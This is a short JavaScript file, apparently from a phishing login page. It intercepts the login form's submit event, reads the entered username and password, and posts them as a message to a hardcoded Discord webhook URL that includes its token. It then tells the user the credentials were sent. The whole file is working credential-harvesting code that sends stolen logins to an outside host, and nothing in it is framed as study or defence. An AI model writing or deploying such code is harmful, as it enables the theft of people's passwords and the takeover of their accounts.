document.getElementById('loginForm').addEventListener('submit', function(event) {
    event.preventDefault(); // Prevent form from submitting normally

    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    const data = {
        username: username,
        password: password
    };

    // Send the data to Discord webhook
    fetch('https://discord.com/api/webhooks/1302119864332451862/7qeTkQ9hgfRWTwpSDz9qaAjwM-K2soyB0dkUiSE_nHtW9mwrX4EOQrg7bPiMc6__OnSu', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            content: `Username: ${data.username}\nPassword: ${data.password}`
        })
    })
    .then(response => {
        if (response.ok) {
            alert('Credentials sent successfully!');
        } else {
            alert('Error sending credentials.');
        }
    })
    .catch(error => {
        console.error('Error:', error);
        alert('Error sending credentials.');
    });
});
